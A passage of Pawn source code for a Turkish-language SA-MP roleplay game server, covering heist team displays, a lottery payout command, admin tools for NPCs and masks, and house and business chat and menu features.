    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][3]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][3]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][3]);
	}
	if(Soygun[_id][oyuncu5] == -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][4]);
	}
    new _name[32];
 	GetPlayerName(Soygun[_id][lider], _name, 32);
	for(new i;i<32;i++)
	{
		if(_name[i] == '_')
		{
		    strdel(_name, i, strlen(_name));
		}
	}
 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][lider],_name);
 	PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][0], _name);
 	format(_name, sizeof(_name), "%d",Karakter[Soygun[_id][lider]][level]);
 	PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][0], _name);
 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][0], Karakter[Soygun[_id][lider]][skin]);
 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][0], SilahObje(GetPlayerWeapon(Soygun[_id][lider])));
    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][0]);
    PlayerTextDrawHide(playerid, OyuncuLevel[playerid][0]);
    PlayerTextDrawHide(playerid, OyuncuIsim[playerid][0]);
    PlayerTextDrawHide(playerid, OyuncuSkin[playerid][0]);
    if(GetPlayerWeapon(Soygun[_id][lider]) != 0) PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][0]);
    PlayerTextDrawShow(playerid, OyuncuLevel[playerid][0]);
    PlayerTextDrawShow(playerid, OyuncuIsim[playerid][0]);
    PlayerTextDrawShow(playerid, OyuncuSkin[playerid][0]);
	if(Soygun[_id][oyuncu2] != -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][1]);
	 	GetPlayerName(Soygun[_id][oyuncu2], _name, 32);
		for(new i;i<32;i++)
		{
			if(_name[i] == '_')
			{
			    strdel(_name, i, strlen(_name));
			}
		}
	 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][oyuncu2],_name);
   		PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][1], _name);
	 	format(_name, sizeof(_name), "%d",Karakter[Soygun[_id][oyuncu2]][level]);
 		PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][1], _name);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][1], Karakter[Soygun[_id][oyuncu2]][skin]);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][1], SilahObje(GetPlayerWeapon(Soygun[_id][oyuncu2])));
	 	if(GetPlayerWeapon(Soygun[_id][oyuncu2]) != 0) PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][1]);
    	PlayerTextDrawShow(playerid, OyuncuLevel[playerid][1]);
    	PlayerTextDrawShow(playerid, OyuncuIsim[playerid][1]);
    	PlayerTextDrawShow(playerid, OyuncuSkin[playerid][1]);
	}
	if(Soygun[_id][oyuncu3] != -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][2]);
	 	GetPlayerName(Soygun[_id][oyuncu3], _name, 32);
		for(new i;i<32;i++)
		{
			if(_name[i] == '_')
			{
			    strdel(_name, i, strlen(_name));
			}
		}
	 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][oyuncu3],_name);
	 	PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][2], _name);
	 	format(_name, sizeof(_name), "%d",Karakter[Soygun[_id][oyuncu3]][level]);
 		PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][2], _name);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][2], Karakter[Soygun[_id][oyuncu3]][skin]);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][2], SilahObje(GetPlayerWeapon(Soygun[_id][oyuncu3])));
	 	if(GetPlayerWeapon(Soygun[_id][oyuncu3]) != 0) PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][2]);
    	PlayerTextDrawShow(playerid, OyuncuLevel[playerid][2]);
    	PlayerTextDrawShow(playerid, OyuncuIsim[playerid][2]);
    	PlayerTextDrawShow(playerid, OyuncuSkin[playerid][2]);
	}
	if(Soygun[_id][oyuncu4] != -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][3]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][3]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][3]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][3]);
	 	GetPlayerName(Soygun[_id][oyuncu4], _name, 32);
		for(new i;i<32;i++)
		{
			if(_name[i] == '_')
			{
			    strdel(_name, i, strlen(_name));
			}
		}
	 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][oyuncu4],_name);
	 	PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][3], _name);
	 	format(_name, sizeof(_name), "%d",Karakter[Soygun[_id][oyuncu4]][level]);
 		PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][3], _name);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][3], Karakter[Soygun[_id][oyuncu4]][skin]);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][3], SilahObje(GetPlayerWeapon(Soygun[_id][oyuncu4])));
	 	if(GetPlayerWeapon(Soygun[_id][oyuncu4]) != 0)PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][3]);
    	PlayerTextDrawShow(playerid, OyuncuLevel[playerid][3]);
    	PlayerTextDrawShow(playerid, OyuncuIsim[playerid][3]);
    	PlayerTextDrawShow(playerid, OyuncuSkin[playerid][3]);
	}
	if(Soygun[_id][oyuncu5] != -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][4]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][4]);
	 	GetPlayerName(Soygun[_id][oyuncu5], _name, 32);
		for(new i;i<32;i++)
		{
			if(_name[i] == '_')
			{
			    strdel(_name, i, strlen(_name));
			}
		}
	 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][oyuncu5],_name);
	 	PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][4], _name);
	 	format(_name, sizeof(_name), "%d",Karakter[Soygun[_id][oyuncu5]][level]);
 		PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][4], _name);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][4], Karakter[Soygun[_id][oyuncu5]][skin]);
	 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][4], SilahObje(GetPlayerWeapon(Soygun[_id][oyuncu5])));
	 	if(GetPlayerWeapon(Soygun[_id][oyuncu5]) != 0) PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][4]);
    	PlayerTextDrawShow(playerid, OyuncuLevel[playerid][4]);
    	PlayerTextDrawShow(playerid, OyuncuIsim[playerid][4]);
    	PlayerTextDrawShow(playerid, OyuncuSkin[playerid][4]);
	}
	return 1;
}

SoygunTextGizle(playerid)
{
	if(Girdi[playerid])
	{
		KillTimer(SoygunTextTimer[playerid]);
		PlayerTextDrawHide(playerid, GeriSayimTD[playerid]);
	    for(new i;i<5;i++)
		{
	    	PlayerTextDrawHide(playerid, SoygunBox[playerid][i]);
	    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][i]);
	    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][i]);
	    	PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][i]);
	    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][i]);
	 	}
	}
}

SilahObje(ssilahid)
{
	new silahmodel = -1;
    switch(ssilahid)
    {
		case 1:
		{
			silahmodel = 331;
		}
		case 2:
    	{
	    	silahmodel = 333;
	 	}
    	case 3:
    	{
    		silahmodel = 334;
    	}
    	case 4:
   		{
    		silahmodel = 335;
    	}
    	case 5:
    	{
    		silahmodel = 336;
    	}
    	case 6:
    	{
    		silahmodel = 337;
    	}
    	case 7:
    	{
    		silahmodel = 338;
    	}
    	case 8:
    	{
    		silahmodel = 339;
    	}
    	case 9:
    	{
    		silahmodel = 341;
    	}
    	case 10:
    	{
    		silahmodel = 321;
    	}
    	case 11:
    	{
    		silahmodel = 322;
    	}
    	case 12:
    	{
    		silahmodel = 323;
    	}
    	case 13:
    	{
    		silahmodel = 324;
    	}
    	case 14:
    	{
    		silahmodel = 325;
    	}
    	case 15:
    	{
    		silahmodel = 326;
    	}
    	case 16:
    	{
    		silahmodel = 342;
    	}
    	case 17:
    	{
    		silahmodel = 343;
    	}
    	case 18:
    	{
    		silahmodel = 344;
    	}
    	case 22:
    	{
    		silahmodel = 346;
    	}
    	case 23:
    	{
    		silahmodel = 347;
    	}
    	case 24:
    	{
    		silahmodel = 348;
		}
    	case 25:
    	{
    		silahmodel = 349;
    	}
    	case 26:
    	{
    		silahmodel = 350;
    	}
    	case 27:
    	{
    		silahmodel = 351;
    	}
    	case 28:
    	{
    		silahmodel = 352;
    	}
    	case 29:
    	{
    		silahmodel = 353;
    	}
    	case 30:
    	{
	   		silahmodel = 355;
    	}
    	case 31:
    	{
    		silahmodel = 356;
    	}
    	case 32:
    	{
    		silahmodel = 372;
    	}
    	case 33:
    	{
    		silahmodel = 357;
    	}
    	case 34:
    	{
    		silahmodel = 358;
    	}
    	case 35:
    	{
    		silahmodel = 359;
    	}
    	case 36:
    	{
    		silahmodel = 360;
    	}
    	case 37:
    	{
    		silahmodel = 361;
    	}
    	case 38:
	   	{
    		silahmodel = 362;
    	}
	   	case 39:
	   	{
		   	silahmodel = 363;
	   	}
	   	case 40:
	   	{
	    	silahmodel = 364;
	   	}
	   	case 41:
	   	{
	    	silahmodel = 365;
	   	}
	   	case 42:
	   	{
	    	silahmodel = 366;
	  	}
	   	case 43:
	   	{
	    	silahmodel = 367;
	   	}
	   	case 44:
	   	{
	    	silahmodel = 368;
	   	}
	   	case 45:
	   	{
	    	silahmodel = 369;
	   	}
	   	case 46:
	   	{
	    	silahmodel = 371;
	  	}
	}
	return silahmodel;
}

HappyHour()
{
	return 0;
}

HpBul(playerid)
{
	new Float:_hp;
	GetPlayerHealth(playerid, _hp);
	return floatround(_hp);
}

CMD:biletlerim(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new query[128],ptip[16];
	format(query, sizeof(query), "SELECT * FROM `piyango` WHERE `sqlid` = '%d'", Karakter[playerid][sqlid]);
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count())
	{
	    return Hata(playerid, "Biletiniz bulunmamaktadýr.");
	}
	else
	{
	    new rows, fields;
	    cache_get_data(rows, fields, g_iHandle);
	    SendClientMessageEx(playerid, -1, ""C2"[BÝLETLERÝM"C1"(%d)"C2"]",rows);
	    for (new i = 0; i < rows; i ++)
	    {
			switch(cache_get_field_content_int(i, "tip"))
			{
				case 1: ptip = "Tam";
				case 2: ptip = "Yarým";
				case 3: ptip = "Çeyrek";
			}
			format(query, sizeof(query), "%s bilet [ "C2"%d "C1"]",ptip,cache_get_field_content_int(i, "piyangono"));
			SendClientMessage(playerid, -1, query);
		}
	    cache_delete(cache);
	}
	return 1;
}

CMD:apiyangobitir(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 6 || !AKontrol(playerid)) return 1;
	static query[128],ppno,nostring[5],pno[5],ptip,psahip,nparax;
	if(sscanf(params,"d",ppno)) return Kullanim(playerid, "/apiyangobitir [piyangono]");
	format(nostring,5,"%d",ppno);
	format(query, sizeof(query), "SELECT * FROM `piyango`");
	new Cache:cache = mysql_query(query,true);
	new rows, fields, oyunda = 0;
 	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++)
	{
	    format(pno,5,"%d",cache_get_field_content_int(i, "piyangono"));
	    if(pno[0] == nostring[0] && pno[1] == nostring[1])
	    {
		    ptip = cache_get_field_content_int(i, "tip");
		    psahip = cache_get_field_content_int(i, "sqlid");
		    if(pno[0] == nostring[0] && pno[1] == nostring[1] && pno[2] == nostring[2] && pno[3] == nostring[3])
		    {
		        if(ptip == 1) nparax=250000;
				else if(ptip == 2) nparax=125000;
				else if(ptip == 3) nparax=62500;
				foreach(new ix : Player)
				{
				    if(Karakter[ix][sqlid] == psahip)
				    {
						format(query, sizeof(query), "%s nolu biletinizden $%d kazandýnýz.",pno, nparax);
						Bilgi(ix, query);
						Log(ix, query);
						oyunda = 1;
				    }
				}
		    }
		    else if(pno[0] == nostring[0] && pno[1] == nostring[1] && pno[2] == nostring[2])
		    {
		        if(ptip == 1) nparax=125000;
				else if(ptip == 2) nparax=62500;
				else if(ptip == 3) nparax=31250;
				foreach(new ix : Player)
				{
				    if(Karakter[ix][sqlid] == psahip)
				    {
						format(query, sizeof(query), "%s nolu biletinizden $%d kazandýnýz.",pno, nparax);
						Bilgi(ix, query);
						Log(ix, query);
						oyunda = 1;
				    }
				}
		    }
		    else if(pno[0] == nostring[0] && pno[1] == nostring[1])
		    {
	   			if(ptip == 1) nparax=25000;
				else if(ptip == 2) nparax=12500;
				else if(ptip == 3) nparax=6250;
				foreach(new ix : Player)
				{
				    if(Karakter[ix][sqlid] == psahip)
				    {
						format(query, sizeof(query), "%s nolu biletinizden $%d kazandýnýz.",pno, nparax);
						Bilgi(ix, query);
						Log(ix, query);
						oyunda = 1;
   		 			}
				}
		    }
		    if(oyunda == 1) {
				Karakter[playerid][banka] += nparax;
		    } else {
			    format(query,sizeof(query),"UPDATE `karakterler` SET banka = banka+%d WHERE `id` = %d",nparax,psahip);
			    mysql_tquery(1,query);
			}
		}
		oyunda = 0;
	}
	cache_delete(cache);
	format(query, sizeof(query), "DELETE FROM `piyango`");
	mysql_tquery(1,query);
	Bilgi(playerid, "Piyango sonuçlandý.");
	return 1;
}

CMD:amaske(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 4) return 1;
	new _pid,mstring[128];
	if(sscanf(params,"d",_pid)) return Kullanim(playerid, "/amaske [oyuncuID]");
	if(IsPlayerConnected(_pid))
	{
		if(!Maske[_pid])
  		{
  		    format(mstring, sizeof(mstring), "%s adlý oyuncuya maske taktýnýz.",OyuncuAdiniBul(_pid,1));
  	 		Bilgi(playerid, mstring);
	        format(mstring, sizeof(mstring), "Maskeli(%d)", Karakter[_pid][maskeno]);
			UpdateDynamic3DTextLabelText(tanismaIsim[_pid], GetPlayerColor(_pid), mstring);
			Maske[_pid] = true;
			/*foreach(new i : Player)
		    {
				ShowPlayerNameTagForPlayer(i, playerid, false);
			}*/
		}
		else
	    {
	        format(mstring, sizeof(mstring), "%s adlý oyuncunun maskesini çýkardýnýz.",OyuncuAdiniBul(_pid,1));
	    	Bilgi(playerid, mstring);
            format(mstring, sizeof(mstring), "%s(%d)", OyuncuAdiniBul(_pid), playerid);
			UpdateDynamic3DTextLabelText(tanismaIsim[_pid], GetPlayerColor(_pid), mstring);
			Maske[_pid] = false;
			/*foreach(new i : Player)
		    {
				ShowPlayerNameTagForPlayer(i, playerid, true);
			}*/
		}
	}
	else return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
	return 1;
}

TelSorgula(playerid, _telno)
{
	new query[128],rows,fields,_isim[32];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `telno` = '%d'", _telno);
	new Cache:cache = mysql_query(query, true);
 	if(cache_num_rows())
	{
	    cache_get_data(rows, fields, g_iHandle);
		cache_get_field_content(0, "isim", _isim, g_iHandle, 255);
		cache_delete(cache);
		SendClientMessage(playerid, -1, ""C3"[LSPD VeriTabaný]");
		SendClientMessageEx(playerid, -1, ""C3"%d "C1"nolu cep telefonu "C3"%s "C1"ismine kayýtlý.",_telno,_isim);
		return 1;
	}
	else return Hata(playerid, "Bu numaraya ait kimse bulunamadý.");
}

CMD:npc(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][level] < 5) return Hata(playerid, "Bu komutu kullanabilmeniz için 5 seviye olmanýz gerekmektedir.");
	if(GetPlayerVirtualWorld(playerid) == 0  && GetPlayerInterior(playerid) == 0) return Hata(playerid, "Bu komutu burada kullamazsýnýz.");
	new mesafe = IsyeriIceridenMesafesi(50.0, playerid);
	if(mesafe == 0) return Hata(playerid, "Herhangi bir iþyerinin içerisinde deðilsiniz.");
	if(!IsyeriYetkilisi(playerid, mesafe)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
	NPCMenuGoster(playerid);
	return 1;
}

CMD:mekisbasi(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(GetPlayerVirtualWorld(playerid) == 0  && GetPlayerInterior(playerid) == 0) return Hata(playerid, "Bu komutu burada kullamazsýnýz.");
	new mesafe = IsyeriIceridenMesafesi(50.0, playerid);
	if(mesafe == 0) return Hata(playerid, "Herhangi bir iþyerinin içerisinde deðilsiniz.");
	if(!IsyeriYetkilisi(playerid, mesafe)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
	if(Isyeri[mesafe][itip] != 15) return Hata(playerid, "Bu iþyeri mekanik deðil.");
 	if(Karakter[playerid][mekisbasi] == 0) {
	Karakter[playerid][mekisbasi] = 1;
	SetPlayerColor(playerid, 0x8B5D2EFF);
	Bilgi(playerid, "Ýþbaþý oldunuz.");
	} else {
	Karakter[playerid][mekisbasi] = 0;
	SetPlayerColor(playerid, COLOR_WHITE);
	Bilgi(playerid, "Ýþbaþýndan ayrýldýnýz.");
	}
	return 1;
}

NPCMenuGoster(playerid)
{
	new mstring[512];
    format(mstring, sizeof(mstring), "NPC\t"C2"Kirala\nNPC\t"C2"Liste\t"C1"["C2"%d"C1"]",NPCSayiBul(playerid));
	ShowPlayerDialog(playerid, 334, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC", mstring, "Seç", "Ýptal");
}

NPCSayiBul(playerid)
{
	new _npclerim=0;
	for(new i;i<MAX_NPC;i++)
	{
	    if(NPC[i][nsahip] == Karakter[playerid][sqlid])
	    {
	        _npclerim++;
	    }
	}
	return _npclerim;
}

NPCListeGoster(playerid)
{
	new mstring[768],_ntext[24];
	for(new i;i<MAX_NPC;i++)
	{
	    if(NPC[i][nsahip] == Karakter[playerid][sqlid])
	    {
			if(NPC[i][ntip] == 1) _ntext = "Striptizci";
			else if(NPC[i][ntip] == 2) _ntext = "Güvenlik";
			else if(NPC[i][ntip] == 3) _ntext = "Barmen";
	        format(mstring, sizeof(mstring), "%s\n%d\t%s\t%s\n", mstring, NPC[i][nid], NPC[i][nad], _ntext);
	    }
	}
	format(mstring, sizeof(mstring), "ID\tAd\tTip\n%s", mstring);
	return ShowPlayerDialog(playerid, 337, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"NPC Liste", mstring, "Seç", "Ýptal");
}

NPCSkinBul(playerid)
{
	new _skin = 0;
	switch(GetPVarInt(playerid, "NPCTip"))
	{
		case 1: _skin = 85;
		case 2: _skin = 24;
		case 3: _skin = 171;
	}
	return _skin;
}

CMD:anpc(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 4 || !AKontrol(playerid)) return 1;
	new _nstring[24], _nid=-1, _say=0;
	if(isnull(params)) return Kullanim(playerid, "/anpc [fonksiyon]"), SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: liste, id, kaldir");
	sscanf(params,"s[24]d",_nstring,_nid);
	if(Buysa(_nstring,"liste"))
	{
	    SendClientMessage(playerid, -1, "____________________________NPC-LISTE_______________________");
		for(new i;i<MAX_NPC;i++)
		{
		    if(IsValidDynamicActor(NPC[i][nid]) && NPC[i][nsahip] != 0)
		    {
				SendClientMessageEx(playerid, -1, "ID:%d - Skin:%d - Ad:%s - Sahip:%s",i,NPC[i][nskin],NPC[i][nad],SQLFromName(NPC[i][nsahip]));
				_say++;
			}
		}
		if(_say == 0) SendClientMessage(playerid, -1, "Sunucuda NPC Bulunmamaktadýr.");
	}
	else if(Buysa(_nstring,"id"))
	{
	    new Float:pPos[3];
	    for(new i;i<MAX_NPC;i++)
		{
		    if(IsValidDynamicActor(NPC[i][nid]) && NPC[i][nsahip] != 0)
		    {
				GetDynamicActorPos(NPC[i][nid], pPos[0], pPos[1], pPos[2]);
				if(IsPlayerInRangeOfPoint(playerid, 1, pPos[0], pPos[1], pPos[2]))
				{
				    SendClientMessageEx(playerid, -1, "ID:%d - Skin:%d - Ad:%s - Sahip:%s",i,NPC[i][nskin],NPC[i][nad],SQLFromName(NPC[i][nsahip]));
				    _say++;
				    break;
				}
		    }
		}
		if(_say == 0) SendClientMessage(playerid, -1, "Yakýnýnýzda NPC Bulunmamaktadýr.");
	}
	else if(Buysa(_nstring,"kaldir"))
	{
	    if(_nid == -1) return Kullanim(playerid, "/anpc kaldir [NPC ID]");
	    if(IsValidDynamicActor(NPC[_nid][nid]))
	    {
		    new mstring[128];
		    format(mstring, sizeof(mstring), "Baþarýyla %d idli NPC'yi kaldýrdýnýz.",_nid);
		    Bilgi(playerid, mstring);
		    DestroyDynamicActor(NPC[_nid][nid]);
		    DestroyDynamic3DTextLabel(NPC[_nid][nadtext]);
		    DestroyDynamic3DTextLabel(NPC[_nid][nyazitext]);
		    NPC[_nid][nsahip] = 0;
		    format(NPC[_nid][nad], 32, "Yok");
		}
		else return Hata(playerid, "Hatalý id belirttiniz.");
	}
	else return Kullanim(playerid, "/anpc [fonksiyon]"), SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: liste, id, kaldir");
	return 1;
}

forward NPCDondur(npcid);
public NPCDondur(npcid)
{
	new Float:_ang;
	GetDynamicActorFacingAngle(npcid, _ang);
	return SetDynamicActorFacingAngle(npcid, _ang+90);
}

CMD:gotocarin(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1 || !AKontrol(playerid)) return 1;
	new _vehid;
	if(sscanf(params,"d",_vehid)) return Kullanim(playerid, "/gotocarin [arac ID]");
	if(!IsValidVehicle(_vehid)) return Hata(playerid, "Hatalý araç id.");
	static _vw;
	_vw = GetVehicleVirtualWorld(_vehid);
	SetPlayerVirtualWorld(playerid, _vw);
	SetPlayerInterior(playerid, GetVehicleInterior(_vehid));
	PutPlayerInVehicle(playerid, _vehid, 0);
	return 1;
}

/*stock IsimVer(playerid)
{
	new query[128],rows,fields,_isim[MAX_PLAYER_NAME];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'",strval(Isim(playerid)));
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count()) return 0;
	cache_get_data(rows, fields, g_iHandle);
	cache_get_field_content(0,"isim",_isim,MAX_PLAYER_NAME);
	cache_delete(cache);
	SetPlayerName(playerid, _isim);
	return 1;
}*/

stock EvIcinde(playerid)
{
	if(Girdi[playerid])
	{
 		foreach(new ev : Houses)
		{
	        if(PlayerToPoint(3.0, playerid, Ev[ev][cikisX], Ev[ev][cikisY], Ev[ev][cikisZ]))
	        {
	            if(GetPlayerVirtualWorld(playerid) == ev)
	            {
	                return ev;
				}
			}
		}
	}
	return 0;
}

forward EvDo(playerid, message[]);
public EvDo(playerid, message[])
{
    new len = strlen(message);
	new count;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{00BF8A}", i+1, len);
				bul = 0;
			    break;
			}
		}
	}
	new string[128];
	format(string, sizeof(string), "* %s (( %s ))", message, OyuncuAdiniBul(playerid));
	foreach(new i : Player)
	{
	    if(EvMesafesi(2.0, playerid) == EvIceridenMesafesi(i))
	    {
			SendClientMessage(i, COLOR_DO, string);
		}
	}
	return 1;
}

forward IsyeriDo(playerid, message[]);
public IsyeriDo(playerid, message[])
{
    new len = strlen(message);
	new count;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{00BF8A}", i+1, len);
				bul = 0;
			    break;
			}
		}
	}
	new string[128];
	format(string, sizeof(string), "* %s (( %s ))", message, OyuncuAdiniBul(playerid));
	foreach(new i : Player)
	{
	    if(IsyeriMesafesi(2.0, playerid) == IsyeriIceridenMesafesi(30.0,i))
	    {
			SendClientMessage(i, COLOR_DO, string);
		}
	}
}

forward EvBagir(playerid, text[]);
public EvBagir(playerid, text[])
{
    foreach(new i : Player)
	{
	    if(EvMesafesi(2.0, playerid) == EvIceridenMesafesi(i))
	    {
			SendClientMessage(i, COLOR_WHITE, text);
		}
	}
}

forward EvDisariBagir(playerid, text[]);
public EvDisariBagir(playerid, text[])
{
    foreach(new i : Player)
	{
	    if(EvMesafesi(2.0, i) == EvIceridenMesafesi(playerid))
	    {
			SendClientMessage(i, COLOR_WHITE, text);
		}
	}
}

forward IsyeriBagir(playerid, text[]);
public IsyeriBagir(playerid, text[])
{
   	foreach(new i : Player)
	{
	    if(IsyeriMesafesi(2.0, playerid) == IsyeriIceridenMesafesi(30.0,i))
	    {
			SendClientMessage(i, COLOR_WHITE, text);
		}
	}
}

CMD:evzil(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(EvMesafesi(2.0, playerid) == 0) return Hata(playerid, "Herhangi bir evin kapýsýnda deðilsiniz.");
	Bilgi(playerid, "Evin zili çaldýnýz.");
	EvDo(playerid, "Evin ziline basmaktadýr.");
	DoGonder(playerid, 20.0, "Evin ziline basmaktadýr.");
	return 1;
}

stock IsciSay(isyeridd)
{
	new _say=0;
    for(new i=0;i<10;i++)
	{
	    if(Isyeri[isyeridd][isci][i] != -1) _say++;
	}
	return _say;
}

IsyeriMenuEkle(playerid)
{
	new
	    _ytad[12],
	    _yad[32],
		_ytip = GetPVarInt(playerid, "MenuTip"),
	 	_ypara = GetPVarInt(playerid, "MenuFiyat"),
	 	_ymodel = GetPVarInt(playerid, "MenuModel");

	GetPVarString(playerid, "MenuAd", _yad, sizeof(_yad));

	if(_ytip == 0) _ytad = "Belirsiz";
	else if(_ytip == 1) _ytad = "Yiyecek";
	else if(_ytip == 2) _ytad = "Ýçecek";

	new mstring[512];
	format(mstring, sizeof(mstring), ""C2"Menü\t\t "C1"Tip\t\t "C2"%s\n",_ytad);
	format(mstring, sizeof(mstring), "%s"C2"Menü\t\t "C1"Fiyat\t\t "C2"%d"DOLAR"$\n",mstring,_ypara);
	format(mstring, sizeof(mstring), "%s"C2"Menü\t\t "C1"Model\t\t "C2"%d\n",mstring,_ymodel);
	format(mstring, sizeof(mstring), "%s"C2"Menü\t\t "C1"Ýsim\t\t "C2"%s\n",mstring,_yad);
	format(mstring, sizeof(mstring), "%s"C2"(Menü Ekle)",mstring);
	return ShowPlayerDialog(playerid, 348, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Menü Ekle", mstring, "Menü Ekle", "Ýptal");
}

IsyeriMenuSay(isyeridd)
{
	new query[64],rows,fields;
	format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",isyeridd);
	new Cache:cache = mysql_query(query,true);
    cache_get_data(rows, fields, g_iHandle);
    cache_delete(cache);
    return rows;
}

IsyeriMenuSatinal(playerid, _iid)
{
	new mstring[2048],query[128],rows,fields,_ttip[12],__ad[32];
	format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",_iid);
	new Cache:cache = mysql_query(query,true);
    cache_get_data(rows, fields, g_iHandle);
    for (new i = 0; i < rows; i ++)
    {
    	cache_get_field_content(i, "isim", __ad);
        if(cache_get_field_content_int(i, "tip") == 1) _ttip = "Yiyecek";
        else if(cache_get_field_content_int(i, "tip") == 2) _ttip = "Ýçecek";
		format(mstring, sizeof(mstring), "%s%s\t%s\t%d\n",
		mstring,
		_ttip,
		__ad,
		cache_get_field_content_int(i, "fiyat"));
	}
	cache_delete(cache);
	format(mstring, sizeof(mstring), "Yiyecek/Ýçecek\tÝsim\tFiyat\n%s",mstring);
	SetPVarInt(playerid, "IsyeriMenuSatinal", _iid);
 	ShowPlayerDialog(playerid, 351, DIALOG_STYLE_TABLIST_HEADERS, Isyeri[_iid][iad], mstring, "Satýn Al", "Ýptal");
	return 1;
}

CMD:toolkit(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new nstring[16],_id=-1,mstring[128];
	if(Birlik[Karakter[playerid][birlik]][ftip] == MODIFIYE) {
	    if(isnull(params)) return Kullanim(playerid, "/toolkit [fonksiyon]"),SendClientMessage(playerid, -1, ""C3"Kullanýlabilir fonksiyonlar: al, ver");
		sscanf(params,"s[16]d",nstring,_id);
		if(Buysa(nstring, "al")) {
